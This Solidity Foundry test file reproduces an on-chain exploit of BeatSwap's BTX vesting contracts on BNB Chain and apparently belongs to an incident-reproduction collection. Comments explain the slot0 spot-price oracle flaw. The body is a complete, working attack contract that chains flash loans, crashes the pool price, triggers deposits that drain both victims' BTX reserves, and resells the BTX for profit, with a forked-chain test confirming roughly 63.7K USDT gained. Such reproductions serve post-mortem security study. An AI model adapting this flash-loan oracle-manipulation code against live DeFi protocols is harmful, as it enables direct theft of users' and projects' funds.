// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// BeatSwap (BTX) LiquidityVestingConvert - slot0 spot-price oracle manipulation draining the
// vesting contracts' own BTX reserves - BNB Chain. Attacker realized ~63,704 USDT profit.
//
// Attack tx      : 0xcc71a3bb131c73462b0f25533070113a63c85e942a22e18bc945eec184eb5799 (block 120873720)
// Attacker EOA   : 0x67B2f08683A735cfE6f6E57fA86909b62218C2a1
// Exploit (on-chain, contract-creation tx; the ctor ran the whole attack): 0xaff5A574941981cF7F994f2820F7fA26FE031DEd
// Victim #1      : 0x1e647FAADb05f2124BFCcFC003EDc06D1A90bf5D  (LiquidityVestingConvert, verified)
// Victim #2      : 0x9a7A92240FBAc4030b65A6E61239928d6Bcc716F  (LiquidityVestingConvertOnce, verified, same logic)
// BTX token      : 0xAa242a47F4cC074E59cbC7D65309B1F21202AaA3
// USDT           : 0x55d398326f99059fF775485246999027B3197955
// Target pool    : 0xA5Db84d7BCcb799fb31bd3c417D04d5bC29Da96D  (PancakeSwap V3 USDT/BTX, fee 100, the slot0 oracle both victims read)
//
// Root cause (confirmed against BeatSwap's verified source, not just the alerts):
//   LiquidityVestingConvert.deposit() is fully permissionless (nonReentrant + whenNotPaused only).
//   It prices BTX off the PancakeSwap V3 pool's spot state with no TWAP, no deviation guard:
//     _calculateQuote(usdtIn): reads TARGET_POOL.slot0().sqrtPriceX96, squares it, and returns
//         requiredBTX = usdtIn * sqrtP^2 / 2^192          (raw spot price, single read)
//     _executeMint(toLP): reads TARGET_POOL.slot0() again for the current tick, builds a
//         +-6000 tick range around it, and mints a V3 LP position pairing the caller's USDT with
//         requiredBTX taken from the contract's OWN BTX reserves, recipient = the vesting contract.
//   The slippage guard is ineffective by construction: amount1Min = requiredBTX * 97 / 100, i.e. it
//   validates the mint against the already-manipulated quote, not against any independent reference,
//   so a crashed spot price passes its own 3% band. deposit() splits 75% of the USDT to treasury and
//   only 25% to the LP, yet sizes the BTX leg off the full manipulated quote, so a tiny USDT deposit
//   drags the contract's entire BTX reserve into a bad-tick position.
//
// Attack flow, reconstructed below as ordinary typed calls (no bytecode blob, no raw calldata replay):
//   1. Flash-borrow 15,950 USDT from Moolah (onMoolahFlashLoan) as working capital.
//   2. Inside a Pancake Infinity Vault lock (lockAcquired), take 6,000,000 BTX flash from the Vault.
//   3. Dump BTX into the V3 pool (zeroForOne=false) to crash sqrtPriceX96 -> BTX quotes far too cheap.
//   4. deposit(10,000 USDT) into victim #1: it mints an LP at the crashed tick using its ~1.24M BTX reserve.
//   5. Dump more BTX to push the price further, then deposit(2,000 USDT) into victim #2: ~1.83M BTX reserve pulled.
//   6. Reverse the swap (buy BTX back) to restore the pool, sweeping up the BTX the victims just added as liquidity.
//   7. Repay the 6M BTX flash to the Vault; sell the net-drained BTX (~2.98M) into the UNMANIPULATED Pancake
//      Infinity CL USDT/BTX pool for ~77,512 USDT; repay Moolah; keep the ~63,704 USDT surplus.
//
// The two "reported loss" figures reconcile here: ~2,984,557 BTX / ~77,512 USDT is the BTX drained from the
// victims and resold on the CL pool (the 77,512 USDT taken from the Vault); ~63,704 USDT is that gross resale
// minus the swap round-trip and the two 75%-to-treasury deposit costs, i.e. the attacker's net realized profit.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IMoolah {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
}

// Pancake Infinity Vault (singleton that custodies funds and tracks transient per-locker deltas).
interface IInfinityVault {
    function lock(bytes calldata data) external returns (bytes memory);
    function take(address currency, address to, uint256 amount) external;
    function sync(address currency) external;
    function settle() external payable returns (uint256 paid);
    function currencyDelta(address locker, address currency) external view returns (int256);
}

// Pancake Infinity CL pool manager (pool math; operates against the Vault's accounting).
interface ICLPoolManager {
    struct PoolKey {
        address currency0;
        address currency1;
        address hooks;
        address poolManager;
        uint24 fee;
        bytes32 parameters;
    }

    struct SwapParams {
        bool zeroForOne;
        int256 amountSpecified; // negative = exact input (v4/Infinity convention)
        uint160 sqrtPriceLimitX96;
    }

    function swap(PoolKey calldata key, SwapParams calldata params, bytes calldata hookData)
        external
        returns (int256 delta);
}

interface IPancakeV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
    function slot0()
        external
        view
        returns (
            uint160 sqrtPriceX96,
            int24 tick,
            uint16 observationIndex,
            uint16 observationCardinality,
            uint16 observationCardinalityNext,
            uint32 feeProtocol,
            bool unlocked
        );
}

interface IVesting {
    function deposit(uint256 usdtAmount) external;
}

contract BeatXswapExploit {
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant BTX = IERC20(0xAa242a47F4cC074E59cbC7D65309B1F21202AaA3);

    IMoolah constant MOOLAH = IMoolah(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);
    IInfinityVault constant VAULT = IInfinityVault(0x238a358808379702088667322f80aC48bAd5e6c4);
    ICLPoolManager constant CL_MANAGER = ICLPoolManager(0xa0FfB9c1CE1Fe56963B0321B32E7A0302114058b);
    address constant CL_HOOK = 0x72e09eBd9b24F47730b651889a4eD984CBa53d90;

    IPancakeV3Pool constant POOL = IPancakeV3Pool(0xA5Db84d7BCcb799fb31bd3c417D04d5bC29Da96D); // oracle pool
    IPancakeV3Pool constant POOL996 = IPancakeV3Pool(0x996A155A2BE7729Ae90884795EA61691FBE84079); // BTX trim pool

    IVesting constant VICTIM1 = IVesting(0x1e647FAADb05f2124BFCcFC003EDc06D1A90bf5D);
    IVesting constant VICTIM2 = IVesting(0x9a7A92240FBAc4030b65A6E61239928d6Bcc716F);

    // Exact amounts observed in the attack trace at the parent block; reproduce deterministically on the fork.
    uint256 constant USDT_FLASH = 15_950e18;
    uint256 constant BTX_FLASH = 6_000_000e18;
    uint256 constant DEPOSIT1 = 10_000e18;
    uint256 constant DEPOSIT2 = 2_000e18;

    int256 constant DUMP1_IN = 6_000_000e18; // exact-input BTX, capped by price limit
    uint160 constant DUMP1_LIMIT = 1764781723873694064036615220121;
    int256 constant DUMP2_IN = 1961580406744256470373928;
    uint160 constant DUMP2_LIMIT = 4795876676032213778971365538586;
    int256 constant REVERSE_IN = 48750848698745158899669; // exact-input USDT to buy BTX back
    uint160 constant MIN_SQRT = 4295128741; // MIN_SQRT_RATIO + 1, price-down floor
    int256 constant TRIM_IN = 82_500e18; // BTX sold on POOL996 to size the CL sale
    uint160 constant MAX_SQRT = 1461446703485210103287273052203988822378723970340; // MAX_SQRT_RATIO region

    function attack() external {
        // Step 1: Moolah USDT flash loan -> onMoolahFlashLoan callback.
        MOOLAH.flashLoan(address(USDT), USDT_FLASH, "");
    }

    // ---- Moolah flash-loan callback ----
    function onMoolahFlashLoan(uint256 amount, bytes calldata) external {
        require(msg.sender == address(MOOLAH), "not moolah");
        // Step 2: enter the Pancake Infinity Vault lock; it calls back lockAcquired.
        VAULT.lock("");
        // Repay Moolah: it pulls the principal via transferFrom after the callback returns (zero fee here).
        USDT.approve(address(MOOLAH), 0);
        USDT.approve(address(MOOLAH), amount);
    }

    // ---- Pancake Infinity Vault lock callback (the attack body) ----
    function lockAcquired(bytes calldata) external returns (bytes memory) {
        require(msg.sender == address(VAULT), "not vault");

        // Step 2b: flash-take 6M BTX from the Vault (settled at the end of the lock).
        VAULT.take(address(BTX), address(this), BTX_FLASH);

        // Step 3: crash the oracle pool's spot price by dumping BTX (zeroForOne=false: BTX in, USDT out).
        POOL.swap(address(this), false, DUMP1_IN, DUMP1_LIMIT, hex"01");

        // Step 4: deposit into victim #1 while the price is crashed -> it mints an LP draining its BTX reserve.
        USDT.approve(address(VICTIM1), DEPOSIT1);
        VICTIM1.deposit(DEPOSIT1);

        // Step 5: push the price further, then deposit into victim #2.
        POOL.swap(address(this), false, DUMP2_IN, DUMP2_LIMIT, hex"01");
        USDT.approve(address(VICTIM2), DEPOSIT2);
        VICTIM2.deposit(DEPOSIT2);

        // Step 6: reverse the swap (zeroForOne=true: USDT in, BTX out) to restore the pool and sweep the
        // liquidity the victims just added, recovering far more BTX than was dumped.
        POOL.swap(address(this), true, REVERSE_IN, MIN_SQRT, hex"01");

        // Step 7a: repay the 6M BTX flash to the Vault.
        VAULT.sync(address(BTX));
        BTX.transfer(address(VAULT), BTX_FLASH);
        VAULT.settle();

        // Step 7b: trim a slice of BTX on a thin pool to size the CL sale exactly.
        POOL996.swap(address(this), false, TRIM_IN, MAX_SQRT, hex"01");

        // Step 7c: sell the net-drained BTX into the UNMANIPULATED Pancake Infinity CL USDT/BTX pool.
        uint256 btxToSell = BTX.balanceOf(address(this));
        ICLPoolManager.PoolKey memory key = ICLPoolManager.PoolKey({
            currency0: address(USDT),
            currency1: address(BTX),
            hooks: CL_HOOK,
            poolManager: address(CL_MANAGER),
            fee: 67,
            parameters: 0x00000000000000000000000000000000000000000000000000000000000a0055
        });
        ICLPoolManager.SwapParams memory sp = ICLPoolManager.SwapParams({
            zeroForOne: false, // BTX(currency1) in, USDT(currency0) out
            amountSpecified: -int256(btxToSell), // exact input of all remaining BTX
            sqrtPriceLimitX96: MAX_SQRT
        });
        CL_MANAGER.swap(key, sp, "");

        // Step 7d: settle the CL deltas - pay the BTX we owe, take the USDT we are owed.
        VAULT.sync(address(BTX));
        BTX.transfer(address(VAULT), btxToSell);
        VAULT.settle();
        int256 usdtCredit = VAULT.currencyDelta(address(this), address(USDT));
        require(usdtCredit > 0, "no usdt credit");
        VAULT.take(address(USDT), address(this), uint256(usdtCredit));

        return "";
    }

    // ---- V3 swap callbacks: pay whichever token we owe (positive delta). token0=USDT, token1=BTX. ----
    function pancakeV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        _payV3(amount0Delta, amount1Delta);
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        _payV3(amount0Delta, amount1Delta);
    }

    function _payV3(int256 amount0Delta, int256 amount1Delta) internal {
        if (amount0Delta > 0) USDT.transfer(msg.sender, uint256(amount0Delta));
        if (amount1Delta > 0) BTX.transfer(msg.sender, uint256(amount1Delta));
    }
}

contract BeatXswap_exp is Test {
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant BTX = IERC20(0xAa242a47F4cC074E59cbC7D65309B1F21202AaA3);
    address constant VICTIM1 = 0x1e647FAADb05f2124BFCcFC003EDc06D1A90bf5D;
    address constant VICTIM2 = 0x9a7A92240FBAc4030b65A6E61239928d6Bcc716F;

    function setUp() public {
        vm.createSelectFork("bsc", 120873719); // parent block of the exploit tx
    }

    /// forge-config: default.evm_version = "cancun"
    function testExploit() public {
        emit log_named_decimal_uint("victim1 BTX reserve before", BTX.balanceOf(VICTIM1), 18);
        emit log_named_decimal_uint("victim2 BTX reserve before", BTX.balanceOf(VICTIM2), 18);

        BeatXswapExploit exploit = new BeatXswapExploit();

        assertEq(USDT.balanceOf(address(exploit)), 0, "attacker should start with no USDT");
        assertEq(BTX.balanceOf(address(exploit)), 0, "attacker should start with no BTX");

        exploit.attack();

        uint256 profit = USDT.balanceOf(address(exploit));
        emit log_named_decimal_uint("victim1 BTX reserve after ", BTX.balanceOf(VICTIM1), 18);
        emit log_named_decimal_uint("victim2 BTX reserve after ", BTX.balanceOf(VICTIM2), 18);
        emit log_named_decimal_uint("attacker USDT profit      ", profit, 18);

        // Both flash loans repaid inside attack(); no BTX left over.
        assertEq(BTX.balanceOf(address(exploit)), 0, "BTX flash not fully repaid");
        // Realized profit matches the on-chain 63,704.837... USDT sent to the attacker EOA.
        assertApproxEqRel(profit, 63_704_837356523361110351, 0.01e18, "profit off expected ~63.7K USDT");
    }
}
